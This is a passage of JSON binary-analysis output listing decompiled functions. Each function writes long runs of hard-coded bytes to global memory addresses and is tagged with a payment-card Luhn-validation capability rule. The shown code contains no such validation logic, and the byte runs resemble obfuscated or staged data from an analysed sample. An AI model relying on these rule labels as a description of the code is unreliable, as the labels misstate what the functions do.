        "decompiled_code": "\nint32_t fcn.00404b50(int32_t param_1)\n\n{\n    *0x445188 = 0x7e;\n    *0x445189 = 0xcc;\n    *0x44518a = 0x76;\n    *0x44518b = 0xb;\n    *0x44518c = 0x67;\n    *0x44518d = 0x1b;\n    *0x44518e = 0x59;\n    *0x44518f = 0xea;\n    *0x445190 = 0x3e;\n    *0x445191 = 0x97;\n    *0x445192 = 0xd6;\n    *0x445193 = 0x7a;\n    *0x445194 = 0xd0;\n    *0x445195 = 100;\n    *0x445196 = 0x32;\n    *0x445197 = 0x28;\n    *0x445198 = 0xfa;\n    *0x445199 = 0x5a;\n    *0x44519a = 5;\n    *0x44519b = 0x56;\n    *0x44519c = 0x31;\n    *0x44519d = 0x84;\n    *0x44519e = 0xbf;\n    *0x44519f = 0xdb;\n    *0x4451a0 = 0xfb;\n    *0x4451a1 = 0xa4;\n    *0x4451a2 = 0x1e;\n    *0x4451a3 = 0x81;\n    *0x4451a4 = 0x73;\n    *0x4451a5 = 0xad;\n    *0x4451a6 = 0xb9;\n    *0x4451a7 = 0x85;\n    *0x4451a8 = 0xc9;\n    *0x4451a9 = 0x48;\n    *0x4451aa = 0x78;\n    *0x4451ab = 0x1b;\n    *0x4451ac = 0xbf;\n    *0x4451ad = 0x50;\n    *0x4451ae = 0x19;\n    *0x4451af = 0xe7;\n    *0x4451b0 = 0x2d;\n    *0x4451b1 = 0x55;\n    *0x4451b2 = 0xad;\n    *0x4451b3 = 0x85;\n    *0x4451b4 = 0x7e;\n    *0x4451b5 = 0x1d;\n    *0x4451b6 = 0x19;\n    *0x445dd8 = 0x65;\n    *0x445dd9 = 0xee;\n    *0x445dda = 0x47;\n    *0x445ddb = 200;\n    *0x445ddc = 0x3b;\n    *0x445ddd = 0x11;\n    *0x445dde = 0x38;\n    *0x445ddf = 0x95;\n    *0x445de0 = 0x78;\n    *0x445de1 = 0x82;\n    *0x445de2 = 0xcf;\n    *0x445de3 = 0x65;\n    *0x445de4 = 0x3c;\n    *0x445de5 = 0x55;\n    *0x445de6 = 0xbe;\n    *0x445de7 = 0x6e;\n    *0x445de8 = 0x68;\n    *0x445de9 = 0x82;\n    *0x445dea = 0xb8;\n    *0x445deb = 10;\n    *0x445dec = 0x25;\n    *0x445ded = 99;\n    *0x445dee = 0xf7;\n    *0x445def = 0x37;\n    *0x445df0 = 0x5b;\n    *0x445df1 = 0x39;\n    *0x445df2 = 0xb7;\n    *0x445df3 = 0x15;\n    *0x445df4 = 0x3b;\n    *0x445df5 = 0xa6;\n    *0x445df6 = 0xb9;\n    *0x445df7 = 0x6a;\n    *0x445df8 = 0xb6;\n    *0x445df9 = 0x34;\n    *0x445dfa = 0xc1;\n    *0x445dfb = 0x21;\n    *0x445dfc = 3;\n    *0x445dfd = 0xcd;\n    *0x445dfe = 0x18;\n    *0x445dff = 199;\n    *0x445e00 = 0x1d;\n    *0x445e01 = 0x42;\n    *0x445e02 = 10;\n    *0x445e03 = 0xd;\n    *0x445e04 = 0x42;\n    *0x445e05 = 0xc5;\n    *0x445e06 = 0x69;\n    return param_1 + 0x12df9a;\n}\n",
        "token_count": 1233
    },
    "004050a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004050a0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404df0(param_1);\n    *0x4451e7 = 0x1e;\n    *0x4451e8 = 0x84;\n    *0x4451e9 = 0xd4;\n    *0x4451ea = 99;\n    *0x4451eb = 0xbf;\n    *0x4451ec = 0x8a;\n    *0x4451ed = 0x3d;\n    *0x4451ee = 0xf4;\n    *0x4451ef = 0xb4;\n    *0x4451f0 = 0xc9;\n    *0x4451f1 = 0x30;\n    *0x4451f2 = 0x25;\n    *0x4451f3 = 0x4d;\n    *0x4451f4 = 0x1b;\n    *0x4451f5 = 0x58;\n    *0x4451f6 = 0xfa;\n    *0x4451f7 = 0xb1;\n    *0x4451f8 = 0xce;\n    *0x4451f9 = 0x73;\n    *0x4451fa = 0x2a;\n    *0x4451fb = 0x57;\n    *0x4451fc = 0x25;\n    *0x4451fd = 0xd6;\n    *0x4451fe = 0xa3;\n    *0x4451ff = 0x8e;\n    *0x445200 = 0xd6;\n    *0x445201 = 0xe7;\n    *0x445202 = 4;\n    *0x445203 = 0xf6;\n    *0x445204 = 0x8a;\n    *0x445205 = 0xa2;\n    *0x445206 = 0x21;\n    *0x445207 = 5;\n    *0x445208 = 0x60;\n    *0x445209 = 0x15;\n    *0x44520a = 0x82;\n    *0x44520b = 0x83;\n    *0x44520c = 0x6a;\n    *0x44520d = 0xe3;\n    *0x44520e = 0xe4;\n    *0x44520f = 0xe;\n    *0x445210 = 0x2e;\n    *0x445211 = 0xc4;\n    *0x445212 = 0xb7;\n    *0x445213 = 0x96;\n    *0x445214 = 0x26;\n    *0x445215 = 3;\n    *0x445e37 = 0x4c;\n    *0x445e38 = 0x3f;\n    *0x445e39 = 0xf6;\n    *0x445e3a = 0x55;\n    *0x445e3b = 0xef;\n    *0x445e3c = 0xe5;\n    *0x445e3d = 0x2a;\n    *0x445e3e = 0x93;\n    *0x445e3f = 0x8a;\n    *0x445e40 = 0x74;\n    *0x445e41 = 0xf6;\n    *0x445e42 = 0xc5;\n    *0x445e43 = 0xac;\n    *0x445e44 = 0xdd;\n    *0x445e45 = 0xd7;\n    *0x445e46 = 0x60;\n    *0x445e47 = 99;\n    *0x445e48 = 0xb6;\n    *0x445e49 = 0x10;\n    *0x445e4a = 0xbb;\n    *0x445e4b = 0xc5;\n    *0x445e4c = 0xb8;\n    *0x445e4d = 0x28;\n    *0x445e4e = 0x93;\n    *0x445e4f = 0x6b;\n    *0x445e50 = 0x42;\n    *0x445e51 = 0x68;\n    *0x445e52 = 0x85;\n    *0x445e53 = 0xf1;\n    *0x445e54 = 0xd5;\n    *0x445e55 = 0x61;\n    *0x445e56 = 0x97;\n    *0x445e57 = 0x77;\n    *0x445e58 = 0x96;\n    *0x445e59 = 0x65;\n    *0x445e5a = 0xb0;\n    *0x445e5b = 0x23;\n    *0x445e5c = 0xd0;\n    *0x445e5d = 9;\n    *0x445e5e = 0x1c;\n    *0x445e5f = 0x9d;\n    *0x445e60 = 0x6f;\n    *0x445e61 = 0xaa;\n    *0x445e62 = 9;\n    *0x445e63 = 0x92;\n    *0x445e64 = 0x85;\n    *0x445e65 = 0xe4;\n    return param_1 + iVar1 + 0x1352c6;\n}\n",
        "token_count": 1292
    },
    "00405350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00405350(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004050a0(param_1);\n    *0x445216 = 0x9e;\n    *0x445217 = 0xe2;\n    *0x445218 = 0x40;\n    *0x445219 = 0;\n    *0x44521a = 0xf2;\n    *0x44521b = 9;\n    *0x44521c = 0x5f;\n    *0x44521d = 0xac;\n    *0x44521e = 0x3f;\n    *0x44521f = 0xfa;\n    *0x445220 = 0xd9;\n    *0x445221 = 0xf;\n    *0x445222 = 0xc6;\n    *0x445223 = 0xf5;\n    *0x445224 = 0xf7;\n    *0x445225 = 0xc5;\n    *0x445226 = 0xfa;\n    *0x445227 = 0xf;\n    *0x445228 = 0x78;\n    *0x445229 = 0x7c;\n    *0x44522a = 3;\n    *0x44522b = 0xb2;\n    *0x44522c = 0xe;\n    *0x44522d = 0x78;\n    *0x44522e = 0x3d;\n    *0x44522f = 0x1b;\n    *0x445230 = 0xe0;\n    *0x445231 = 0x10;\n    *0x445232 = 0xba;\n    *0x445233 = 0xda;\n    *0x445234 = 6;\n    *0x445235 = 0x2f;\n    *0x445236 = 0xbc;\n    *0x445237 = 0x56;\n    *0x445238 = 0x10;\n    *0x445239 = 0xd3;\n    *0x44523a = 0x3b;\n    *0x44523b = 0x46;\n    *0x44523c = 0x7f;\n    *0x44523d = 0x91;\n    *0x44523e = 0x65;\n    *0x44523f = 0x39;\n    *0x445240 = 0x4a;\n    *0x445241 = 0xf;\n    *0x445242 = 0x19;\n    *0x445243 = 0xf;\n    *0x445244 = 0x5a;\n    *0x445e66 = 0xc;\n    *0x445e67 = 0x31;\n    *0x445e68 = 0xc9;\n    *0x445e69 = 0x1c;\n    *0x445e6a = 0x9c;\n    *0x445e6b = 0xb1;\n    *0x445e6c = 0x13;\n    *0x445e6d = 0xf8;\n    *0x445e6e = 0x96;\n    *0x445e6f = 0xc9;\n    *0x445e70 = 0xe1;\n    *0x445e71 = 0xe1;\n    *0x445e72 = 0xb8;\n    *0x445e73 = 0x36;\n    *0x445e74 = 0xd5;\n    *0x445e75 = 0x88;\n    *0x445e76 = 0x26;\n    *0x445e77 = 0x39;\n    *0x445e78 = 0x35;\n    *0x445e79 = 0x5e;\n    *0x445e7a = 0xe8;\n    *0x445e7b = 0x16;\n    *0x445e7c = 0x6a;\n    *0x445e7d = 0x1b;\n    *0x445e7e = 0x69;\n    *0x445e7f = 0x96;\n    *0x445e80 = 0x82;\n    *0x445e81 = 0x38;\n    *0x445e82 = 0xf9;\n    *0x445e83 = 0x86;\n    *0x445e84 = 0xae;\n    *0x445e85 = 0x74;\n    *0x445e86 = 0x4c;\n    *0x445e87 = 0x36;\n    *0x445e88 = 0xc4;\n    *0x445e89 = 0x53;\n    *0x445e8a = 0xfa;\n    *0x445e8b = 0xfb;\n    *0x445e8c = 0xbd;\n    *0x445e8d = 0x9a;\n    *0x445e8e = 0xfd;\n    *0x445e8f = 0xad;\n    *0x445e90 = 0x38;\n    *0x445e91 = 0xd5;\n    *0x445e92 = 0x36;\n    *0x445e93 = 0x29;\n    *0x445e94 = 0xf6;\n    return param_1 + iVar1 + 0x121bc5;\n}\n",
        "token_count": 1261
    },
    "00405600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00405600(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405350(param_1);\n    *0x445245 = 0x88;\n    *0x445246 = 0x6c;\n    *0x445247 = 0x7d;\n    *0x445248 = 0xe;\n    *0x445249 = 0x4b;\n    *0x44524a = 0x25;\n    *0x44524b = 0x8d;\n    *0x44524c = 0xb9;\n    *0x44524d = 0x3d;\n    *0x44524e = 0x40;\n    *0x44524f = 0x1c;\n    *0x445250 = 0x1f;\n    *0x445251 = 0x53;\n    *0x445252 = 0x6e;\n    *0x445253 = 0x5a;\n    *0x445254 = 0xfb;\n    *0x445255 = 0x19;\n    *0x445256 = 0x92;\n    *0x445257 = 0x4d;\n    *0x445258 = 0x7c;\n    *0x445259 = 0x2e;\n    *0x44525a = 0x46;\n    *0x44525b = 0x4f;\n    *0x44525c = 0xc4;\n    *0x44525d = 0xc5;\n    *0x44525e = 0x54;\n    *0x44525f = 0x8b;\n    *0x445260 = 0x67;\n    *0x445261 = 0x25;\n    *0x445262 = 0x3e;\n    *0x445263 = 0x84;\n    *0x445264 = 0xf2;\n    *0x445265 = 0x2a;\n    *0x445266 = 0xb7;\n    *0x445267 = 0x8e;\n    *0x445268 = 0x61;\n    *0x445269 = 0xc2;\n    *0x44526a = 0x28;\n    *0x44526b = 0x53;\n    *0x44526c = 0xa8;\n    *0x44526d = 0x71;\n    *0x44526e = 0x2c;\n    *0x44526f = 0x4f;\n    *0x445270 = 0x2b;\n    *0x445271 = 0xcd;\n    *0x445272 = 0x13;\n    *0x445273 = 0x55;\n    *0x445e95 = 0xd1;\n    *0x445e96 = 0xe8;\n    *0x445e97 = 0xd1;\n    *0x445e98 = 0x5d;\n    *0x445e99 = 0x22;\n    *0x445e9a = 0x3b;\n    *0x445e9b = 7;\n    *0x445e9c = 0xf5;\n    *0x445e9d = 0x9e;\n    *0x445e9e = 0xba;\n    *0x445e9f = 0xb5;\n    *0x445ea0 = 0xed;\n    *0x445ea1 = 0xe0;\n    *0x445ea2 = 0xd6;\n    *0x445ea3 = 200;\n    *0x445ea4 = 0x97;\n    *0x445ea5 = 0xc6;\n    *0x445ea6 = 0x61;\n    *0x445ea7 = 0xb1;\n    *0x445ea8 = 0xe7;\n    *0x445ea9 = 0xf4;\n    *0x445eaa = 0x13;\n    *0x445eab = 0xe3;\n    *0x445eac = 0xf8;\n    *0x445ead = 0x4f;\n    *0x445eae = 9;\n    *0x445eaf = 0x57;\n    *0x445eb0 = 0x88;\n    *0x445eb1 = 0x82;\n    *0x445eb2 = 0x41;\n    *0x445eb3 = 0xb;\n    *0x445eb4 = 0x77;\n    *0x445eb5 = 0x7c;\n    *0x445eb6 = 0x1f;\n    *0x445eb7 = 0x7e;\n    *0x445eb8 = 0x4c;\n    *0x445eb9 = 0xf0;\n    *0x445eba = 0xeb;\n    *0x445ebb = 0x36;\n    *0x445ebc = 0xb0;\n    *0x445ebd = 0xd4;\n    *0x445ebe = 0x50;\n    *0x445ebf = 0x3b;\n    *0x445ec0 = 0xf1;\n    *0x445ec1 = 0xe2;\n    *0x445ec2 = 0xde;\n    *0x445ec3 = 0x99;\n    return param_1 + iVar1 + 0x1209fb;\n}\n",
        "token_count": 1268
    },
    "004058b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004058b0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405600(param_1);\n    *0x445274 = 0x46;\n    *0x445275 = 2;\n    *0x445276 = 0x62;\n    *0x445277 = 8;\n    *0x445278 = 0xc6;\n    *0x445279 = 0x50;\n    *0x44527a = 0x52;\n    *0x44527b = 0x62;\n    *0x44527c = 0x6d;\n    *0x44527d = 0x88;\n    *0x44527e = 0x4d;\n    *0x44527f = 0x30;\n    *0x445280 = 0x73;\n    *0x445281 = 0x93;\n    *0x445282 = 0x74;\n    *0x445283 = 0x94;\n    *0x445284 = 0xff;\n    *0x445285 = 0xeb;\n    *0x445286 = 0x1c;\n    *0x445287 = 0x82;\n    *0x445288 = 0xb2;\n    *0x445289 = 0x1f;\n    *0x44528a = 0x4c;\n    *0x44528b = 0x44;\n    *0x44528c = 0x1c;\n    *0x44528d = 0x54;\n    *0x44528e = 0x41;\n    *0x44528f = 0xf6;\n    *0x445290 = 0x45;\n    *0x445291 = 0xbe;\n    *0x445292 = 0xea;\n    *0x445293 = 0xb;\n    *0x445294 = 0x26;\n    *0x445295 = 0x2b;\n    *0x445296 = 0x6c;\n    *0x445297 = 0xc6;\n    *0x445298 = 0x2d;\n    *0x445299 = 0x79;\n    *0x44529a = 0x9f;\n    *0x44529b = 0xc1;\n    *0x44529c = 0xbd;\n    *0x44529d = 0x1b;\n    *0x44529e = 0x8f;\n    *0x44529f = 0x69;\n    *0x4452a0 = 0xab;\n    *0x4452a1 = 0x98;\n    *0x4452a2 = 0xfc;\n    *0x445ec4 = 0x80;\n    *0x445ec5 = 0x1b;\n    *0x445ec6 = 0x8a;\n    *0x445ec7 = 0xe2;\n    *0x445ec8 = 0x73;\n    *0x445ec9 = 0x3f;\n    *0x445eca = 0x29;\n    *0x445ecb = 0xa9;\n    *0x445ecc = 4;\n    *0x445ecd = 0x56;\n    *0x445ece = 0xf8;\n    *0x445ecf = 8;\n    *0x445ed0 = 0x10;\n    *0x445ed1 = 0x2a;\n    *0x445ed2 = 0x17;\n    *0x445ed3 = 0x1b;\n    *0x445ed4 = 0x98;\n    *0x445ed5 = 0xca;\n    *0x445ed6 = 10;\n    *0x445ed7 = 0x83;\n    *0x445ed8 = 0x44;\n    *0x445ed9 = 8;\n    *0x445eda = 0x37;\n    *0x445edb = 0xe4;\n    *0x445edc = 0xdb;\n    *0x445edd = 0xfc;\n    *0x445ede = 0x6a;\n    *0x445edf = 0x67;\n    *0x445ee0 = 0xcd;\n    *0x445ee1 = 0x7f;\n    *0x445ee2 = 0x53;\n    *0x445ee3 = 0x38;\n    *0x445ee4 = 0xa9;\n    *0x445ee5 = 0xb1;\n    *0x445ee6 = 7;\n    *0x445ee7 = 9;\n    *0x445ee8 = 0xa7;\n    *0x445ee9 = 0x74;\n    *0x445eea = 0x7b;\n    *0x445eeb = 0x8e;\n    *0x445eec = 0x1f;\n    *0x445eed = 0xef;\n    *0x445eee = 0xd;\n    *0x445eef = 0xff;\n    *0x445ef0 = 0x10;\n    *0x445ef1 = 0xb;\n    *0x445ef2 = 0xfb;\n    return param_1 + iVar1 + 0x156845;\n}\n",
        "token_count": 1233
    },
    "00405b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00405b60(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004058b0(param_1);\n    *0x4452a3 = 0x80;\n    *0x4452a4 = 0xc2;\n    *0x4452a5 = 0xb;\n    *0x4452a6 = 0xda;\n    *0x4452a7 = 0x9a;\n    *0x4452a8 = 0x40;\n    *0x4452a9 = 0xa4;\n    *0x4452aa = 0xd2;\n    *0x4452ab = 0xa0;\n    *0x4452ac = 0x56;\n    *0x4452ad = 0x26;\n    *0x4452ae = 0xbf;\n    *0x4452af = 0x51;\n    *0x4452b0 = 0xac;\n    *0x4452b1 = 0x67;\n    *0x4452b2 = 0x32;\n    *0x4452b3 = 0xbc;\n    *0x4452b4 = 0xdb;\n    *0x4452b5 = 0xd3;\n    *0x4452b6 = 0xee;\n    *0x4452b7 = 199;\n    *0x4452b8 = 0xf1;\n    *0x4452b9 = 0xe9;\n    *0x4452ba = 0x6d;\n    *0x4452bb = 0xab;\n    *0x4452bc = 0xf1;\n    *0x4452bd = 0xbd;\n    *0x4452be = 0x59;\n    *0x4452bf = 0x75;\n    *0x4452c0 = 0x50;\n    *0x4452c1 = 0x74;\n    *0x4452c2 = 0x14;\n    *0x4452c3 = 0x87;\n    *0x4452c4 = 0x7a;\n    *0x4452c5 = 0xcb;\n    *0x4452c6 = 0x31;\n    *0x4452c7 = 0x15;\n    *0x4452c8 = 0x4a;\n    *0x4452c9 = 0x90;\n    *0x4452ca = 0xf8;\n    *0x4452cb = 0xa8;\n    *0x4452cc = 0x95;\n    *0x4452cd = 0x27;\n    *0x4452ce = 0xe6;\n    *0x4452cf = 0x9e;\n    *0x4452d0 = 0xa0;\n    *0x4452d1 = 7;\n    *0x445ef3 = 0x99;\n    *0x445ef4 = 0x9a;\n    *0x445ef5 = 0xf9;\n    *0x445ef6 = 0xe9;\n    *0x445ef7 = 0x1d;\n    *0x445ef8 = 0x84;\n    *0x445ef9 = 0xab;\n    *0x445efa = 0x5f;\n    *0x445efb = 0x4f;\n    *0x445efc = 0xb7;\n    *0x445efd = 0x56;\n    *0x445efe = 0x48;\n    *0x445eff = 0x79;\n    *0x445f00 = 0xc1;\n    *0x445f01 = 0xf6;\n    *0x445f02 = 0x75;\n    *0x445f03 = 0xe6;\n    *0x445f04 = 0x53;\n    *0x445f05 = 0xca;\n    *0x445f06 = 0x18;\n    *0x445f07 = 0x67;\n    *0x445f08 = 0xc3;\n    *0x445f09 = 0xd4;\n    *0x445f0a = 0x49;\n    *0x445f0b = 0xd1;\n    *0x445f0c = 0x8b;\n    *0x445f0d = 0x5a;\n    *0x445f0e = 0x85;\n    *0x445f0f = 0x7c;\n    *0x445f10 = 200;\n    *0x445f11 = 0x68;\n    *0x445f12 = 0x2a;\n    *0x445f13 = 0xc6;\n    *0x445f14 = 0xbc;\n    *0x445f15 = 0x4b;\n    *0x445f16 = 0xfc;\n    *0x445f17 = 0x8e;\n    *0x445f18 = 0x4c;\n    *0x445f19 = 0x17;\n    *0x445f1a = 0xa3;\n    *0x445f1b = 0xb9;\n    *0x445f1c = 0x83;\n    *0x445f1d = 0x23;\n    *0x445f1e = 0x2b;\n    *0x445f1f = 0xb1;\n    *0x445f20 = 0xd;\n    *0x445f21 = 0x88;\n    return param_1 + iVar1 + 0x1370ab;\n}\n",
        "token_count": 1314
    },
    "00406360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00406360(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004060b0(param_1);\n    *0x445330 = 0x4c;\n    *0x445331 = 0x32;\n    *0x445332 = 0xbe;\n    *0x445333 = 0x51;\n    *0x445334 = 4;\n    *0x445335 = 0x6c;\n    *0x445336 = 0xb5;\n    *0x445337 = 0x6c;\n    *0x445338 = 0xa7;\n    *0x445339 = 0x74;\n    *0x44533a = 0xb2;\n    *0x44533b = 0xc4;\n    *0x44533c = 0xb7;\n    *0x44533d = 0xdd;\n    *0x44533e = 0xe1;\n    *0x44533f = 0xe5;\n    *0x445340 = 0x2b;\n    *0x445341 = 0x4e;\n    *0x445342 = 0x23;\n    *0x445343 = 0xb3;\n    *0x445344 = 0xed;\n    *0x445345 = 2;\n    *0x445346 = 0x8a;\n    *0x445347 = 0xe0;\n    *0x445348 = 0x5b;\n    *0x445349 = 0x49;\n    *0x44534a = 0xe0;\n    *0x44534b = 0x77;\n    *0x44534c = 0xc6;\n    *0x44534d = 6;\n    *0x44534e = 0x21;\n    *0x44534f = 0x55;\n    *0x445350 = 0xf6;\n    *0x445351 = 0x2f;\n    *0x445352 = 0xfc;\n    *0x445353 = 0xab;\n    *0x445354 = 0xa3;\n    *0x445355 = 0x50;\n    *0x445356 = 0x56;\n    *0x445357 = 0x7d;\n    *0x445358 = 0xfd;\n    *0x445359 = 8;\n    *0x44535a = 199;\n    *0x44535b = 0x26;\n    *0x44535c = 0x26;\n    *0x44535d = 0x8b;\n    *0x44535e = 0x1b;\n    *0x445f80 = 0x84;\n    *0x445f81 = 0x59;\n    *0x445f82 = 0xb4;\n    *0x445f83 = 0x29;\n    *0x445f84 = 0xfc;\n    *0x445f85 = 0x44;\n    *0x445f86 = 0x28;\n    *0x445f87 = 0xfc;\n    *0x445f88 = 0x46;\n    *0x445f89 = 0xf9;\n    *0x445f8a = 0x5d;\n    *0x445f8b = 0x8b;\n    *0x445f8c = 0x5c;\n    *0x445f8d = 0x3e;\n    *0x445f8e = 0x51;\n    *0x445f8f = 0xaf;\n    *0x445f90 = 0xdb;\n    *0x445f91 = 0x9f;\n    *0x445f92 = 0xe2;\n    *0x445f93 = 0x46;\n    *0x445f94 = 0x85;\n    *0x445f95 = 0xe9;\n    *0x445f96 = 0x54;\n    *0x445f97 = 0xaf;\n    *0x445f98 = 0xc0;\n    *0x445f99 = 0xb1;\n    *0x445f9a = 0xcf;\n    *0x445f9b = 0x50;\n    *0x445f9c = 0x15;\n    *0x445f9d = 0xcb;\n    *0x445f9e = 0xdf;\n    *0x445f9f = 0x11;\n    *0x445fa0 = 0xb1;\n    *0x445fa1 = 0xd3;\n    *0x445fa2 = 0xf3;\n    *0x445fa3 = 0xde;\n    *0x445fa4 = 0xe7;\n    *0x445fa5 = 0xa8;\n    *0x445fa6 = 0xde;\n    *0x445fa7 = 0x28;\n    *0x445fa8 = 0xac;\n    *0x445fa9 = 0xeb;\n    *0x445faa = 0x59;\n    *0x445fab = 0x65;\n    *0x445fac = 0x19;\n    *0x445fad = 0x85;\n    *0x445fae = 0x7e;\n    return param_1 + iVar1 + 0x149f92;\n}\n",
        "token_count": 1248
    },
    "00406610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00406610(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406360(param_1);\n    *0x44535f = 0xd2;\n    *0x445360 = 0xb3;\n    *0x445361 = 0x1e;\n    *0x445362 = 0xd2;\n    *0x445363 = 2;\n    *0x445364 = 0x2f;\n    *0x445365 = 0x9e;\n    *0x445366 = 0xa0;\n    *0x445367 = 0xb;\n    *0x445368 = 0x98;\n    *0x445369 = 0xfa;\n    *0x44536a = 0xed;\n    *0x44536b = 0x97;\n    *0x44536c = 0xdf;\n    *0x44536d = 0xb4;\n    *0x44536e = 0x57;\n    *0x44536f = 0x23;\n    *0x445370 = 0x6c;\n    *0x445371 = 99;\n    *0x445372 = 0x2b;\n    *0x445373 = 0x80;\n    *0x445374 = 0x98;\n    *0x445375 = 0x34;\n    *0x445376 = 0xf0;\n    *0x445377 = 0x52;\n    *0x445378 = 0x31;\n    *0x445379 = 100;\n    *0x44537a = 0xdc;\n    *0x44537b = 0x93;\n    *0x44537c = 0xfa;\n    *0x44537d = 200;\n    *0x44537e = 0x5d;\n    *0x44537f = 0x11;\n    *0x445380 = 0x28;\n    *0x445381 = 0x46;\n    *0x445382 = 0x92;\n    *0x445383 = 0xec;\n    *0x445384 = 0xe6;\n    *0x445385 = 0x59;\n    *0x445386 = 0xce;\n    *0x445387 = 0x19;\n    *0x445388 = 0xd2;\n    *0x445389 = 0x91;\n    *0x44538a = 0x1c;\n    *0x44538b = 0xe2;\n    *0x44538c = 0x7e;\n    *0x44538d = 0x11;\n    *0x445faf = 0x8c;\n    *0x445fb0 = 0xed;\n    *0x445fb1 = 0x1e;\n    *0x445fb2 = 0x4f;\n    *0x445fb3 = 0x99;\n    *0x445fb4 = 8;\n    *0x445fb5 = 0xa7;\n    *0x445fb6 = 0x2d;\n    *0x445fb7 = 0xf;\n    *0x445fb8 = 0xf1;\n    *0x445fb9 = 0xd1;\n    *0x445fba = 0x61;\n    *0x445fbb = 0x71;\n    *0x445fbc = 0x52;\n    *0x445fbd = 0x93;\n    *0x445fbe = 0x97;\n    *0x445fbf = 200;\n    *0x445fc0 = 0x77;\n    *0x445fc1 = 0xa8;\n    *0x445fc2 = 0x5e;\n    *0x445fc3 = 0x21;\n    *0x445fc4 = 0xd2;\n    *0x445fc5 = 0xe;\n    *0x445fc6 = 0xa9;\n    *0x445fc7 = 0xb;\n    *0x445fc8 = 0x79;\n    *0x445fc9 = 0x88;\n    *0x445fca = 0x51;\n    *0x445fcb = 0x1d;\n    *0x445fcc = 0xa6;\n    *0x445fcd = 0x1d;\n    *0x445fce = 0x90;\n    *0x445fcf = 0x6e;\n    *0x445fd0 = 0x37;\n    *0x445fd1 = 0x98;\n    *0x445fd2 = 0x87;\n    *0x445fd3 = 0x1b;\n    *0x445fd4 = 0x2c;\n    *0x445fd5 = 6;\n    *0x445fd6 = 0xba;\n    *0x445fd7 = 0xc5;\n    *0x445fd8 = 0x2b;\n    *0x445fd9 = 0x3b;\n    *0x445fda = 0x8f;\n    *0x445fdb = 0x11;\n    *0x445fdc = 0xff;\n    *0x445fdd = 0x4d;\n    return param_1 + iVar1 + 0x13ad9e;\n}\n",
        "token_count": 1238
    },
    "00406b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00406b60(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004068c0(param_1);\n    *0x4453bd = 0xf1;\n    *0x4453be = 0xfd;\n    *0x4453bf = 0x8a;\n    *0x4453c0 = 0xda;\n    *0x4453c1 = 0x9b;\n    *0x4453c2 = 0x45;\n    *0x4453c3 = 0x93;\n    *0x4453c4 = 0xb4;\n    *0x4453c5 = 0x2e;\n    *0x4453c6 = 0x78;\n    *0x4453c7 = 0xe0;\n    *0x4453c8 = 0x3f;\n    *0x4453c9 = 0x76;\n    *0x4453ca = 0xdc;\n    *0x4453cb = 0xfb;\n    *0x4453cc = 0x4b;\n    *0x4453cd = 0xd8;\n    *0x4453ce = 0xef;\n    *0x4453cf = 0x40;\n    *0x4453d0 = 0x1f;\n    *0x4453d1 = 0xcb;\n    *0x4453d2 = 0xe1;\n    *0x4453d3 = 0x61;\n    *0x4453d4 = 0xf5;\n    *0x4453d5 = 0x5a;\n    *0x4453d6 = 0x16;\n    *0x4453d7 = 0xe3;\n    *0x4453d8 = 0x7c;\n    *0x4453d9 = 0xa4;\n    *0x4453da = 0xa5;\n    *0x4453db = 0xa0;\n    *0x4453dc = 0x55;\n    *0x4453dd = 0x5c;\n    *0x4453de = 0xdc;\n    *0x4453df = 0x43;\n    *0x4453e0 = 0x97;\n    *0x4453e1 = 0x49;\n    *0x4453e2 = 0xb9;\n    *0x4453e3 = 0xcf;\n    *0x4453e4 = 0x4b;\n    *0x4453e5 = 0xc6;\n    *0x4453e6 = 0x72;\n    *0x4453e7 = 0x18;\n    *0x4453e8 = 0xf1;\n    *0x4453e9 = 0x43;\n    *0x4453ea = 0xee;\n    *0x4453eb = 0x47;\n    *0x44600d = 0x46;\n    *0x44600e = 0x61;\n    *0x44600f = 0x46;\n    *0x446010 = 0x73;\n    *0x446011 = 0x7a;\n    *0x446012 = 0x5e;\n    *0x446013 = 0xaa;\n    *0x446014 = 0x53;\n    *0x446015 = 0xac;\n    *0x446016 = 0xf0;\n    *0x446017 = 0x34;\n    *0x446018 = 0xb8;\n    *0x446019 = 0xee;\n    *0x44601a = 0xc0;\n    *0x44601b = 0xca;\n    *0x44601c = 0xaa;\n    *0x44601d = 0x98;\n    *0x44601e = 0xd7;\n    *0x44601f = 0xd4;\n    *0x446020 = 0xd9;\n    *0x446021 = 0xc3;\n    *0x446022 = 0x27;\n    *0x446023 = 0xbf;\n    *0x446024 = 0x15;\n    *0x446025 = 0xce;\n    *0x446026 = 3;\n    *0x446027 = 0x7a;\n    *0x446028 = 0xd4;\n    *0x446029 = 0xdd;\n    *0x44602a = 0xa2;\n    *0x44602b = 0xfc;\n    *0x44602c = 0xaf;\n    *0x44602d = 0x56;\n    *0x44602e = 0x9f;\n    *0x44602f = 0xbc;\n  